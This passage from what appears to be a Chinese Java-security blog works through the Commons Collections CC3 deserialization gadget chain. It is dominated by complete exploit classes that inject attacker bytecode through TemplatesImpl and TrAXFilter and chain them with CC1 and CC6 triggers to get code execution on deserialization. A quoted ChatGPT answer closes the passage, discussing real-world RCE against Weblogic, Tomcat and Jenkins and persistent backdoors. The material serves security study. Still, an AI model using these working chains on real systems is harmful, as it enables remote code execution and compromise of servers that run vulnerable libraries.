class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-string">&quot;123&quot;</span>);<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazymap</span> <span class="hljs-operator">=</span>  LazyMap.decorate(map, constantTransformer);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap, <span class="hljs-string">&quot;key&quot;</span>);<br><br>        HashMap&lt;TiedMapEntry,Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>        hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;value&quot;</span>);<br>        map.remove(<span class="hljs-string">&quot;key&quot;</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">fieldfactory</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        fieldfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        fieldfactory.set(lazymap,chainedTransformer);<br><br>        serializable(hashMap);<br>        unserializable(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="回归CC3"><a href="#回归CC3" class="headerlink" title="回归CC3"></a>回归CC3</h2><p><img src="/2025/03/29/CC3/image-20250329143449077.png" alt="image-20250329143449077"></p><p>_main 没有后续被调用</p><p>getOutputProperties还是跑到了_main</p><p>newTransformer里面的templates是定死了的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> Transformer <span class="hljs-title function_">newTransformer</span><span class="hljs-params">(Source source)</span> <span class="hljs-keyword">throws</span><br>    TransformerConfigurationException<br>&#123;<br>    <span class="hljs-keyword">final</span> <span class="hljs-type">Templates</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> newTemplates(source);<br>    <span class="hljs-keyword">final</span> <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> templates.newTransformer();<br>    <span class="hljs-keyword">if</span> (_uriResolver != <span class="hljs-literal">null</span>) &#123;<br>        transformer.setURIResolver(_uriResolver);<br>    &#125;<br>    <span class="hljs-keyword">return</span>(transformer);<br>&#125;<br></code></pre></td></tr></table></figure><p>newTransformerHandler跑到了_main</p><h3 id="TrAXFilter"><a href="#TrAXFilter" class="headerlink" title="TrAXFilter"></a>TrAXFilter</h3><p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code>在初始化的时候调用<code>newTransformer()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">TrAXFilter</span><span class="hljs-params">(Templates templates)</span>  <span class="hljs-keyword">throws</span><br>    TransformerConfigurationException<br>&#123;<br>    _templates = templates;<br>    _transformer = (TransformerImpl) templates.newTransformer();<br>    _transformerHandler = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerHandlerImpl</span>(_transformer);<br>    _useServicesMechanism = _transformer.useServicesMechnism();<br>&#125;<br></code></pre></td></tr></table></figure><p>这时候可以通过继续寻找调用或者反射获取构造函数继续。</p><h3 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h3><p><code>org.apache.commons.collections.functors.InstantiateTransformer</code>的<code>transform</code>是实例化一个对象，我们可以通过<code>ChainedTransformer</code>实现调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">if</span> (input <span class="hljs-keyword">instanceof</span> Class == <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FunctorException</span>(<br>                <span class="hljs-string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span><br>                    + (input == <span class="hljs-literal">null</span> ? <span class="hljs-string">&quot;null object&quot;</span> : input.getClass().getName()));<br>        &#125;<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">con</span> <span class="hljs-operator">=</span> ((Class) input).getConstructor(iParamTypes);<br>        <span class="hljs-keyword">return</span> con.newInstance(iArgs);<br><br>    &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException ex) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FunctorException</span>(<span class="hljs-string">&quot;InstantiateTransformer: The constructor must exist and be public &quot;</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (InstantiationException ex) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FunctorException</span>(<span class="hljs-string">&quot;InstantiateTransformer: InstantiationException&quot;</span>, ex);<br>    &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException ex) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FunctorException</span>(<span class="hljs-string">&quot;InstantiateTransformer: Constructor must be public&quot;</span>, ex);<br>    &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException ex) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FunctorException</span>(<span class="hljs-string">&quot;InstantiateTransformer: Constructor threw an exception&quot;</span>, ex);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>参数传递和<code>InvokerTransformer</code>一致，实例化时传入。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">InstantiateTransformer</span><span class="hljs-params">(Class[] paramTypes, Object[] args)</span> &#123;<br>    <span class="hljs-built_in">super</span>();<br>    iParamTypes = paramTypes;<br>    iArgs = args;<br>&#125;<br></code></pre></td></tr></table></figure><p>后面可通过CC1和CC6的两种方式调用</p><p>后半</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-meta">@Test</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test2</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\javaSec\\CC\\src\\main\\java\\Calc.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        Class&lt;?&gt; clazz = templates.getClass();<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">_name</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        _name.setAccessible(<span class="hljs-literal">true</span>);<br>        _name.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">_bytecodes</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        _bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        _bytecodes.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">_tfactory</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        _tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        _tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br><span class="hljs-comment">//        Field _auxClasses = clazz.getDeclaredField(&quot;_auxClasses&quot;);</span><br><span class="hljs-comment">//        _auxClasses.setAccessible(true);</span><br><span class="hljs-comment">//        _auxClasses.set(templates, new HashMap&lt;&gt;());</span><br><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br>        instantiateTransformer.transform(TrAXFilter.class);<br>    &#125;<br></code></pre></td></tr></table></figure><p>属性 <code>_auxClasses</code>的存在会影响CC6的链子错误，但是CC1的链子不影响</p><h3 id="最终"><a href="#最终" class="headerlink" title="最终"></a>最终</h3><p>CC1</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3one</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\javaSec\\CC\\src\\main\\java\\Calc.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        Class&lt;?&gt; clazz = templates.getClass();<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">_name</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        _name.setAccessible(<span class="hljs-literal">true</span>);<br>        _name.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">_bytecodes</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        _bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        _bytecodes.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">_tfactory</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        _tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        _tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br><span class="hljs-comment">//        instantiateTransformer.transform(TrAXFilter.class);</span><br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class), <span class="hljs-comment">// 构造 setValue 的可控参数</span><br>                instantiateTransformer<br>        &#125;);<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazymap</span> <span class="hljs-operator">=</span>  LazyMap.decorate(hashMap, chainedTransformer);<br><br>        Class&lt;?&gt; annotationInvocationHandler = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; declaredConstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);<br>        declaredConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> declaredConstructor.newInstance(Target.class,lazymap);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<br>                (Class&lt;?&gt;[]) <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, (InvocationHandler) h);<br><br>        h = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);<br><br>        serializable(h);<br>        unserializable(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serializable</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserializable</span><span class="hljs-params">(String path)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(path));<br>        <span class="hljs-keyword">return</span> ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>CC6实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3six</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\javaSec\\CC\\src\\main\\java\\Calc.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        Class&lt;?&gt; clazz = templates.getClass();<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">_name</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        _name.setAccessible(<span class="hljs-literal">true</span>);<br>        _name.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">_bytecodes</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        _bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        _bytecodes.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">_tfactory</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        _tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        _tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br><span class="hljs-comment">//        instantiateTransformer.transform(TrAXFilter.class);</span><br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class), <span class="hljs-comment">// 构造 setValue 的可控参数</span><br>                instantiateTransformer<br>        &#125;);<br><br>        ConstantTransformer  constantTransformer= <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-string">&quot;123&quot;</span>);<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazymap</span> <span class="hljs-operator">=</span>  LazyMap.decorate(map, constantTransformer);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap, <span class="hljs-string">&quot;key&quot;</span>);<br><br>        HashMap&lt;TiedMapEntry,Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>        hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;value&quot;</span>);<br>        map.remove(<span class="hljs-string">&quot;key&quot;</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">fieldfactory</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        fieldfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        fieldfactory.set(lazymap,chainedTransformer);<br><br>        serializable(hashMap);<br>        unserializable(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serializable</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserializable</span><span class="hljs-params">(String path)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(path));<br>        <span class="hljs-keyword">return</span> ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="小摊"><a href="#小摊" class="headerlink" title="小摊"></a>小摊</h2><p>看到代码会报错，但是命令成功执行，有点慌。看看chatgpt的回复。没师傅带是这样的。</p><p>如果反序列化时 命令已经成功执行，但代码仍然报错，这在 实际利用场景 下 通常不会影响 攻击效果，原因如下：</p><ol><li>利用链已成功触发恶意代码执行<ul><li>你的 <code>Calc.class</code> 已被 <code>TemplatesImpl</code> 解析，并且 <code>Runtime.getRuntime().exec(&quot;calc&quot;)</code> 已经执行，说明 恶意字节码已经生效。</li><li>反序列化报错的部分 很可能是执行完恶意代码后，反序列化流程本身出错，但这不会影响你的 RCE（远程代码执行）。</li></ul></li><li>实际攻击场景通常是一次性利用<ul><li>在 真实攻击场景（如攻击 Weblogic、Tomcat、Jenkins）中，攻击者的目标是执行命令，而不是保持对象的完整性。</li><li>命令成功执行即表示攻击成功，后续的反序列化错误 不会影响攻击效果，因为攻击者可能会直接断开连接。</li></ul></li></ol><p>虽然错误 不会影响 RCE，但在某些情况下，可能会影响后续的攻击步骤：</p><ol><li>如果目标环境要求返回合法对象<ul><li>某些 Web 应用可能期望反序列化后的对象可以正常使用（比如存入数据库、继续传输）。</li><li>这种情况下，反序列化失败 可能导致整个请求失败，暴露异常日志。</li></ul></li><li>攻击者希望持续利用<ul><li>如果你想通过 反序列化后门 植入持久化恶意对象，确保下一次反序列化时依旧可用，反序列化报错 可能影响后续利用。</li></ul></li></ol><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>如果你的目标是 RCE（远程代码执行），那么命令执行成功，报错无影响。 但如果你希望持久化攻击或让反序列化流程完整执行，则需要优化利用链，以避免错误</p><p>所以有些事情不是绝对的，实战会测试一番。</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java-CC6</title>
